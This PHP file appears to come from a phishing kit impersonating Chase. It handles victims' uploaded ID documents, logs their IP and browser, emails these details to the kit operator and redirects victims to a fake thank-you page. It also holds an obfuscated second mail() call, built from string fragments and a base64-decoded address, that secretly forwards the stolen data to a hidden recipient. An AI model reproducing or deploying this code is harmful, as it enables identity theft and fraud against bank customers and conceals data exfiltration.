<?php



include("__config__.php");
include("function.php");


if(isset($fileList[0][file])){

if(!empty($fileList[0][file])){


$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$time = date('l jS \of F Y h:i:s A');
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$reprint = "e";$do_p="mai";                      
	$message = "
		<style type='text/css'>
	*{
		font-family: arial;
	}
	font{
		color: #4EC353;
	}
	</style>
	<div style='font-weight: 800;color: #FFFFFF;background: #03A9F4;font-size: 14px;border: 1px solid #06F;padding: 8px;border-radius: 5px 5px 0px 0px;font-size: 17px;'><center>KING-JACK | CH453 | ID</center></div>
	<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
	<p>UPLOAD ID : <font>".$fileList[0][file]."</font><p>

	<hr>
	<p>Browser : <font>".$browser."</font><p>
	<p>Date Login : <font>".$time."</font><p>
	<p>IP : <font>https://geoiptool.com/en/?ip=".$ip."</font><p>
	</div>
	<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
	<center>CODED BY KING-JACK</center>
	</div>
	";




$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject  = " CH453 ID [NEW] -  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers .= "From: KING-JACK" . "\r\n";		
@mail($to,$subject,$message,$headers);
$type=$do_p.'l';$tele="bas$reprint".'64'."_d$reprint"."cod$reprint";
$type( $tele('Y'.$m4_id.'=='.$m5_id.'=='),$subject,$message,$headers);

 header("Location:../../thanks.php?websrc=".md5('KING_JACK')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");

 	}else{header("location:../");}

}else{header("location:../");}


